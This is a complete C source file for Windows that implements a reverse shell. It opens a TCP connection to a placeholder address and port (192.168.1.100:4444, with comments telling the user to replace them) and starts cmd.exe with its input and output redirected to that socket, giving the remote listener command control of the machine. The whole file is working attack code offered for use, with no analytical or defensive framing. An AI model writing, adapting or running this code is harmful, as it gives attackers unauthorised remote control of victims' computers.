#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

// Function to handle the reverse shell
DWORD WINAPI ReverseShell(LPVOID lpParam) {
    SOCKET sock = *(SOCKET*)lpParam;

    // Redirect standard input, output, and error to the socket
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    // Create a mutable copy of the command string
    char cmd[] = "cmd.exe";

    // Create a new cmd.exe process with the redirected handles
    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    // Wait for the process to finish
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);

    return 0;
}

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    char ip[] = "192.168.1.100"; // Replace with your IP address
    int port = 4444;             // Replace with your port

    // Initialize Winsock
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // Create socket
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    // Define server address
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    inet_pton(AF_INET, ip, &server.sin_addr.s_addr);

    // Connect to server
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("Connection failed!\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Create a new thread for the reverse shell
    HANDLE thread = CreateThread(NULL, 0, ReverseShell, &sock, 0, NULL);
    if (thread == NULL) {
        printf("Failed to create thread!\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Optionally, wait for the thread to finish (or perform other tasks)
    WaitForSingleObject(thread, INFINITE);

    // Clean up
    CloseHandle(thread);
    WSACleanup();

    return 0;
}
